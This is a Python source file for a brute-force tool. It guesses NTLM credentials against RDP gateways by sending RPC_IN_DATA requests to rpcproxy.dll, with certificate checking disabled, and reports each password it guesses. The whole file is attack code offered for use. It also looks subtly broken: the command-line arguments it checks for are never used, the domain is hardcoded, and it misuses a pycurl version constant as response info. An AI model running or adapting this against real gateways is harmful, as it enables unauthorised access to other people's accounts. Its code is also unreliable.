import sys
import pycurl
from .scanner import ProtocolScanner

if len(sys.argv) != 5:
        print("[*] NTLM Brute Force Tool For RDP Gateways")
        print("[*] Usage: %s <RDP Gateway IP> <users file> <passwords file> <domain> [debug]" % sys.argv[0])
        print("[*] Example: %s localhost users.txt passwords.txt WORK\n" % sys.argv[0])
        sys.exit(0)

domain = 'HOMEGROUP'

class RDPscanner(ProtocolScanner):

    def __init__(self, protocolName, portNumber, IPAddress):
        super(RDPscanner, self).__init__(protocolName, portNumber, IPAddress)



    def verifyCredentials(self, credentials):
        rdp_gateway = "https://" + self.IPAddress + "/rpc/rpcproxy.dll?localhost:3388"
        updata = domain + "\\" + credentials
        packet = pycurl.Curl()
        packet.setopt(pycurl.URL,rdp_gateway)
        packet.setopt(pycurl.CUSTOMREQUEST, "RPC_IN_DATA")
        packet.setopt(pycurl.SSL_VERIFYPEER, 0)
        packet.setopt(pycurl.USERAGENT, "MSRPC")
        packet.setopt(pycurl.HTTPAUTH, 8)
        packet.setopt(pycurl.USERPWD,updata)
        #packet.setopt(pycurl.VERBOSE, 0)
        #packet.setopt(pycurl.DEBUGFUNCTION, log)
        try:
                packet.perform()
                result_code = packet.getinfo(pycurl.RESPONSE_CODE)
                if (result_code) == 200:
                    print("[+] Password Guessed : " + updata+ "\n")
                    evidence = packet.getinfo(pycurl.VERSION_NTLM).split(' ')[1] + "-based"
                    return evidence
        except:
            return None

